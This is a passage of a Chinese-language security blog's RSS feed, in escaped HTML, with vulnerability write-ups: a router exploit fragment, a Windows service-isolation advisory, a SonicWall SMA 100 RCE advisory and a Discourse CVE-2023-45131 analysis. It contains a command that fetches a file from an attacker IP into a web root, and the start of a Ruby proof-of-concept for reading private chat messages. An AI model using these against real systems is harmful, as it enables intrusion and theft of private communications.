class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:8000/index.jpg -P /www;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;完整Python利用代码&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该漏洞允许攻击者在root用户上下文中执行任意代码，危害极大。建议用户及时更新固件版本。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>服务隔离技术解析：Windows服务安全与权限提升漏洞分析</title>
+        <link>http://localhost:1313/p/%E6%9C%8D%E5%8A%A1%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90windows%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E4%B8%8E%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Thu, 07 Aug 2025 04:30:33 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%9C%8D%E5%8A%A1%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90windows%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E4%B8%8E%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h2 id=&#34;服务隔离技术说明&#34;&gt;服务隔离技术说明
+&lt;/h2&gt;&lt;p&gt;过去几天，在Cesar Cerrudo发布概念验证代码后，服务隔离问题成为我们关注的重点。IIS团队的Nazim Lala已发布详细博客说明修复方案及耗时原因。该补丁的代码修改量预计接近XP SP2级别，我们需要将Vista服务加固的大量基础设施工作回溯移植到旧版本系统，这对安全更新而言是项浩大工程。&lt;/p&gt;
+&lt;h3 id=&#34;受影响用户范围&#34;&gt;受影响用户范围
+&lt;/h3&gt;&lt;p&gt;攻击者需要满足以下条件才能利用此漏洞：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在Windows服务上下文中执行代码&lt;/li&gt;
+&lt;li&gt;进程令牌需具备SeImpersonatePrivilege权限&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;典型攻击场景包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;托管服务商运行不可信代码的IIS环境&lt;/li&gt;
+&lt;li&gt;SQL Server场景中，数据库管理员拥有数据库权限但无主机权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;检测方法&#34;&gt;检测方法
+&lt;/h3&gt;&lt;p&gt;使用Process Explorer检查运行不可信代码的进程令牌：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;双击目标进程&lt;/li&gt;
+&lt;li&gt;查看&amp;quot;Security&amp;quot;标签页&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;示例1：以NETWORK SERVICE身份运行的Svchost
+![Svchost进程示例]&lt;/p&gt;
+&lt;p&gt;示例2：以普通用户身份运行的cmd.exe
+![cmd进程示例]&lt;/p&gt;
+&lt;h3 id=&#34;漏洞触发条件&#34;&gt;漏洞触发条件
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;进程令牌具有SeImpersonatePrivilege权限&lt;/li&gt;
+&lt;li&gt;进程运行权限低于SYSTEM级别&lt;/li&gt;
+&lt;li&gt;进程执行不可信代码或允许不可信用户执行代码&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;符合条件的环境请务必参考[安全建议951306]实施缓解措施。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;本文档按&amp;quot;原样&amp;quot;提供，不提供任何担保。&lt;/em&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>SonicWall SMA 100系列管理界面远程代码执行漏洞分析</title>
+        <link>http://localhost:1313/p/sonicwall-sma-100%E7%B3%BB%E5%88%97%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Thu, 07 Aug 2025 02:08:32 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/sonicwall-sma-100%E7%B3%BB%E5%88%97%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;sonicwall-secure-mobile-access-sma-100系列管理界面远程代码执行漏洞&#34;&gt;SonicWall Secure Mobile Access (SMA) 100系列管理界面远程代码执行漏洞
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;MS-ISAC咨询编号&lt;/strong&gt;: 2025-043&lt;br&gt;
+&lt;strong&gt;发布日期&lt;/strong&gt;: 2025年4月22日&lt;/p&gt;
+&lt;h2 id=&#34;概述&#34;&gt;概述
+&lt;/h2&gt;&lt;p&gt;在SonicWall Secure Mobile Access (SMA) 100管理界面中发现了一个漏洞，可能导致远程代码执行。SonicWall SMA是企业用于提供远程应用访问的统一安全网关。成功利用此漏洞可能导致远程代码执行。&lt;/p&gt;
+&lt;h2 id=&#34;威胁情报&#34;&gt;威胁情报
+&lt;/h2&gt;&lt;p&gt;根据SonicWall 2025年4月15日的公告，该漏洞已被发现在野外被积极利用。作为预防措施，SonicWall PSIRT已将CVSS评分从中等提升至高危(7.2)。&lt;/p&gt;
+&lt;h2 id=&#34;受影响系统&#34;&gt;受影响系统
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;SMA 200&lt;/li&gt;
+&lt;li&gt;SMA 210&lt;/li&gt;
+&lt;li&gt;SMA 400&lt;/li&gt;
+&lt;li&gt;SMA 410&lt;/li&gt;
+&lt;li&gt;SMA 500v (ESX, KVM, AWS, Azure)&lt;/li&gt;
+&lt;li&gt;版本10.2.1.0-17sv及更早版本&lt;/li&gt;
+&lt;li&gt;版本10.2.0.7-34sv及更早版本&lt;/li&gt;
+&lt;li&gt;版本9.0.0.10-28sv及更早版本&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;风险等级&#34;&gt;风险等级
+&lt;/h2&gt;&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;用户类型&lt;/th&gt;
+          &lt;th&gt;风险等级&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;政府机构(大中型)&lt;/td&gt;
+          &lt;td&gt;高&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;政府机构(小型)&lt;/td&gt;
+          &lt;td&gt;中&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;企业(大中型)&lt;/td&gt;
+          &lt;td&gt;高&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;企业(小型)&lt;/td&gt;
+          &lt;td&gt;中&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;家庭用户&lt;/td&gt;
+          &lt;td&gt;低&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;p&gt;SonicWall Secure Mobile Access (SMA) 100系列管理界面中存在漏洞，可能导致远程代码执行。漏洞详情如下：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;战术&lt;/strong&gt;: 初始访问(TA0001)&lt;br&gt;
+&lt;strong&gt;技术&lt;/strong&gt;: 利用面向公众的应用程序(T1190)&lt;/p&gt;
+&lt;p&gt;SMA100管理界面中对特殊元素的不当中和处理允许远程认证攻击者以&amp;rsquo;nobody&amp;rsquo;用户身份注入任意命令，可能导致代码执行(CVE-2021-20035)。&lt;/p&gt;
+&lt;p&gt;成功利用此漏洞可能导致远程代码执行。&lt;/p&gt;
+&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h2&gt;&lt;p&gt;建议采取以下措施：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;软件更新&lt;/strong&gt;: 在适当测试后立即应用SonicWall提供的更新(M1051: 更新软件)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;漏洞管理流程&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;建立并维护企业资产的漏洞管理流程(保障措施7.1)&lt;/li&gt;
+&lt;li&gt;建立基于风险的修复策略，每月至少审查一次(保障措施7.2)&lt;/li&gt;
+&lt;li&gt;每月至少执行一次自动化应用补丁管理(保障措施7.4)&lt;/li&gt;
+&lt;li&gt;每季度至少执行一次内部企业资产的自动化漏洞扫描(保障措施7.5)&lt;/li&gt;
+&lt;li&gt;每月至少修复一次检测到的漏洞(保障措施7.7)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;网络基础设施&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;确保网络基础设施保持最新(保障措施12.1)&lt;/li&gt;
+&lt;li&gt;建立并维护安全的网络架构(保障措施12.2)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;渗透测试&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;建立适合企业规模的渗透测试计划(保障措施18.1)&lt;/li&gt;
+&lt;li&gt;每年至少执行一次外部渗透测试(保障措施18.2)&lt;/li&gt;
+&lt;li&gt;根据企业政策修复渗透测试发现的问题(保障措施18.3)&lt;/li&gt;
+&lt;li&gt;对关键应用进行渗透测试(保障措施16.13)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;权限管理&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对所有系统和服务应用最小权限原则(M1026: 特权账户管理)&lt;/li&gt;
+&lt;li&gt;管理企业资产和软件的默认账户(保障措施4.7)&lt;/li&gt;
+&lt;li&gt;建立并维护服务账户清单(保障措施5.5)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;利用防护&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用功能检测和阻止可能导致软件利用的条件(M1050: 利用防护)&lt;/li&gt;
+&lt;li&gt;尽可能在企业资产和软件上启用反利用功能(保障措施10.5)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;网络分段&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过网络分段隔离关键系统(M1030: 网络分段)&lt;/li&gt;
+&lt;li&gt;使用DMZ隔离面向互联网的服务&lt;/li&gt;
+&lt;li&gt;配置单独的VPC实例隔离关键云系统&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;参考资料&#34;&gt;参考资料
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;CVE: &lt;a class=&#34;link&#34; href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-20035&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-20035&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;SonicWall: &lt;a class=&#34;link&#34; href=&#34;https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0022&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0022&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>Discourse 3.1.1未授权访问漏洞分析：聊天消息泄露风险</title>
+        <link>http://localhost:1313/p/discourse-3.1.1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%81%8A%E5%A4%A9%E6%B6%88%E6%81%AF%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9/</link>
+        <pubDate>Wed, 06 Aug 2025 21:46:50 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/discourse-3.1.1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%81%8A%E5%A4%A9%E6%B6%88%E6%81%AF%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9/</guid>
+        <description>&lt;h1 id=&#34;discourse-311---未授权访问聊天消息漏洞分析&#34;&gt;Discourse 3.1.1 - 未授权访问聊天消息漏洞分析
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE编号&lt;/strong&gt;: CVE-2023-45131&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CVSS评分&lt;/strong&gt;: 7.5 (高危)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;影响版本&lt;/strong&gt;: Discourse &amp;lt; 3.1.1稳定版, &amp;lt; 3.2.0.beta2&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;: 未授权访问&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
+&lt;/h2&gt;&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理
+&lt;/h3&gt;&lt;p&gt;该漏洞存在于Discourse的消息总线(MessageBus)实现中，允许未认证用户：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;获取MessageBus客户端ID&lt;/li&gt;
+&lt;li&gt;订阅聊天频道&lt;/li&gt;
+&lt;li&gt;访问私密消息&lt;/li&gt;
+&lt;li&gt;实时监控聊天内容&lt;/li&gt;
+&lt;li&gt;获取历史消息记录&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;漏洞验证代码&#34;&gt;漏洞验证代码
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;net/http&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;uri&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;json&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;openssl&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;base64&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;CVE202345131&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;initialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;vi&#34;&gt;@target_url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chomp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;vi&#34;&gt;@results&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;vi&#34;&gt;@message_bus_client_id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kp&#34;&gt;nil&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;vi&#34;&gt;@csrf_token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kp&#34;&gt;nil&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;run_exploit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[*] Testing CVE-2023-45131: Discourse Unauthenticated Chat Message Access&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;[*] Target: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;vi&#34;&gt;@target_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;test_messagebus_access&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;test_chat_channel_enumeration&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;test_private_message_access&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;test_real_time_monitoring&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;test_message_history_access&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;test_user_enumeration_via_chat&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;generate_report&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;end&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kp&#34;&gt;private&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;test_messagebus_access&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;[*] Testing MessageBus unauthenticated access...&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;uri&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;URI&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;#{&lt;/span&gt;&lt;span class=&#34;vi&#34;&gt;@target_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/message-bus/poll&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;make_request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
